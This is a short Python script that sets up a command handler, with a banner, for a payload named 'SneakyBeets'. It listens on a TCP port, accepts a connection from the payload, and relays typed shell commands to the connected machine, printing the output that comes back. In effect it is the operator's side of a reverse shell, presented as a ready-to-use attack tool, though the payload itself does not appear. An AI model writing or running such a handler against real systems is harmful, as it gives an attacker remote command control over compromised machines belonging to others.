#This is a python version of the handler

#!/usr/bin/env python3

import socket
from art import text2art

#cool intro stuff
awesome = text2art("SneakyBeets")

print(awesome)
print("This is a handler for the one and only SneakyBeets payload")
print("Written by Jarod Keene")


HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 1234        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    s.bind((HOST, PORT))
    print("Socket bind complete")

    s.listen()
    print("Listening on port " + str(PORT))
    conn, addr = s.accept()
    with conn:
        print('Connected by ' + addr[0] + ':' + str(addr[1]))
        
        #initial connection stuff
        data = conn.recv(2048)
        print(data.decode())

        #continue case
        cont = 1

        while cont:

            command = input("Handler-> ")
            command += '\n'

            if command == '\n':
            	continue
            
            conn.sendall(command.encode())

            #leave conditions
            if command == "exit\n":
            	cont = 0
            if not data:
                cont = 0

            data = conn.recv(2048)
            print(data.decode())

        conn.close()
            